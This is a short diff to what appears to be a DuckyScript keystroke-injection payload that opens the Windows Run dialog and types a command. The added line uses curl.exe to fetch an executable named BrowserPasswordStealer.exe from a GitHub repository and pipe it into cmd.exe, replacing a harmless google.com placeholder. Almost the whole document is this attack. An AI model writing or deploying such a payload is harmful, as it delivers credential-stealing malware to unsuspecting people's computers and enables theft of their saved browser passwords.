@@ -1,6 +1,6 @@
 LOCALE GB
 GUI r
 DELAY 200
-STRING curl.exe --url https://google.com | cmd.exe
-DELAY 50
+STRING curl.exe --url https://github.com/leon-robinson/Payloads/raw/main/EXE/BrowserPasswordStealer.exe | cmd.exe
+DELAY 500
 ENTER
